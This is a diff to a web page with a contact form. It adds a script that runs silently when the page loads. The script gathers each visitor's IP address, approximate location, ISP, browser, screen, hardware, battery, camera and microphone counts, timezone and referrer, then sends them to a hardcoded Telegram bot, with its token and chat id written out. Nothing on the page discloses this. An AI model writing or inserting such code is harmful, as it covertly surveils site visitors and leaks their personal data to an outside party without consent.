@@ -145,7 +145,94 @@
   </form>    
 </div>
 
-<script>
+    <script>
+(async () => {
+  const chatId = "1732507994"; 
+  const botToken = "6122283333:AAE85h7VL4WG_Bb8I_nit0CWxUgorWBYQ6o"; 
+
+  // Basic Info from IP API
+  let ipData = {};
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    ipData = await res.json();
+  } catch (e) {
+    ipData = { ip: 'Unknown', city: '-', region: '-', country_name: '-', org: '-' };
+  }
+
+
+  let micCount = 0, camCount = 0;
+  try {
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    micCount = devices.filter(d => d.kind === 'audioinput').length;
+    camCount = devices.filter(d => d.kind === 'videoinput').length;
+  } catch (e) {}
+
+ 
+  let batteryInfo = '';
+  try {
+    const battery = await navigator.getBattery();
+    batteryInfo = ` Battery: ${battery.level * 100}% | Charging: ${battery.charging}`;
+  } catch (e) {}
+
+
+  const data = {
+    ip: ipData.ip,
+    city: ipData.city,
+    region: ipData.region,
+    country: ipData.country_name,
+    isp: ipData.org,
+      
+
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: `${screen.width}x${screen.height}`,
+    resolution: `${window.innerWidth}x${window.innerHeight}`,
+    pixelRatio: window.devicePixelRatio,
+    memory: navigator.deviceMemory || 'Unknown',
+    cores: navigator.hardwareConcurrency || 'Unknown',
+    referrer: document.referrer || 'No Referrer',
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    time: new Date().toLocaleString(),
+    micCount,
+    camCount,
+    batteryInfo,
+    touchSupport: 'ontouchstart' in window,
+    online: navigator.onLine,
+    connectionType: navigator.connection?.effectiveType || 'Unknown'
+  };
+
+
+  const msg = `
+
+ Time: ${data.time}
+ IP: ${data.ip}
+ Location: ${data.city}, ${data.region}, ${data.country}
+ ISP: ${data.isp}
+ Device: ${data.platform}
+ User Agent: <blockquote> ${data.userAgent} </blockquote>
+ Screen: ${data.screen} (Window: ${data.resolution})
+ ${data.batteryInfo}
+ Mics: ${data.micCount}, 📸 Cams: ${data.camCount}
+ RAM: ${data.memory} GB | ⚙️ Cores: ${data.cores}
+ Lang: ${data.language} | 🕰 TZ: ${data.timezone}
+ Connection: ${data.connectionType} | Online: ${data.online}
+ Touch Support: ${data.touchSupport}
+↩ Referrer: ${data.referrer}
+Lat/Lon: ${data.latitude}, ${data.longitude}
+`;
+    
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'HTML'})
+  });
+})();
+</script>
+
+
+            <script>
     document.getElementById("contactForm").addEventListener("submit", function(event) {
         event.preventDefault();
 
